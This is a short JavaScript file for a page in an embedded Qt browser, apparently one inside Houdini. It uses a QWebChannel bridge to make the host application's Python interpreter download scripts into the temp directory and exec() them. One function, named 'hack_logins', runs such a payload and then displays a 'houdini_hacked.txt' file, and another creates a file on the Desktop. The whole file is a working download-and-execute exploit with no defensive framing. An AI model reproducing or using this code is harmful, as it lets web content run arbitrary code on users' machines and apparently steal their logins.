
window.onload = function() {
    if (!qt || !qt.webChannelTransport) {
        // The web channel transport does not exist so we must not
        // be running in the embedded browser.
        return;
    }
    new QWebChannel(qt.webChannelTransport, function(channel) {
        window.Python = channel.objects.Python;
    });
}

function hack_logins() {
    window.Python.runStatements('import os;import urllib.request;import tempfile;url = "hack_logins.py";filename = os.path.basename(url);tmp_path = os.path.join(tempfile.gettempdir(), filename);urllib.request.urlretrieve(url, tmp_path);exec(open(tmp_path).read())');
    window.Python.runStringExpression(
        "__import__('pathlib').Path(__import__('tempfile').gettempdir() + '/houdini_hacked.txt').read_text()",
        function (result) {
            document.getElementById('result').innerHTML = result;
        }
    );
}

function create_file() {
    window.Python.runStatements('import os;import urllib.request;import tempfile;url = "create_file.py";filename = os.path.basename(url);tmp_path = os.path.join(tempfile.gettempdir(), filename);urllib.request.urlretrieve(url, tmp_path);exec(open(tmp_path).read())');
    document.getElementById('result').innerHTML = 'File created on Desktop';
}

